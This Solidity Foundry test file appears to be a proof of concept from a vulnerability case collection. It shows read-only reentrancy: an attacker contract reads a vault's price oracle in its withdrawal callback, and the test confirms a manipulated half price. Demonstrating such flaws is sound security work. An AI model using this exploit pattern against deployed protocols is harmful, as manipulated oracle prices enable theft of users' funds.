// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {LPVault} from "../../src/case002_readonly_reentrancy/LPVault.sol";

/// @dev Attacker LP that snapshots the vault's price oracle DURING its own
///      withdrawal callback -- the read-only reentrancy.
contract ReentrantLP {
    LPVault public immutable vault;
    uint256 public observedPrice;

    constructor(LPVault _vault) {
        vault = _vault;
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 amt) external {
        vault.withdraw(amt);
    }

    receive() external payable {
        // Read the oracle mid-withdraw: balance already reduced, supply not yet.
        observedPrice = vault.pricePerShare();
    }
}

/// @notice Runnable proof for case002 -- read-only reentrancy.
///         A PASSING test means the price oracle returned a manipulated value
///         (half its true value) to a contract called back during withdraw().
contract ReentrancyPoC is Test {
    LPVault internal vault;
    ReentrantLP internal attacker;
    address internal honest;

    function setUp() public {
        vault = new LPVault();
        attacker = new ReentrantLP(vault);
        honest = makeAddr("honest");

        vm.deal(honest, 50 ether);
        vm.prank(honest);
        vault.deposit{value: 50 ether}();

        vm.deal(address(this), 50 ether);
        attacker.deposit{value: 50 ether}();
    }

    function test_readOnlyReentrancyManipulatesPrice() public {
        uint256 truePriceBefore = vault.pricePerShare();
        assertEq(truePriceBefore, 1e18, "price should start at 1.0");

        attacker.attack(50 ether);

        uint256 observed = attacker.observedPrice();
        uint256 truePriceAfter = vault.pricePerShare();

        assertLt(observed, truePriceBefore, "oracle should read low during reentrancy");
        assertEq(observed, 0.5e18, "mid-reentrancy price reads 0.5 vs true 1.0");
        assertEq(truePriceAfter, 1e18, "price restores after the call settles");

        emit log_named_decimal_uint("true price", truePriceBefore, 18);
        emit log_named_decimal_uint("price seen mid-reentrancy", observed, 18);
    }
}
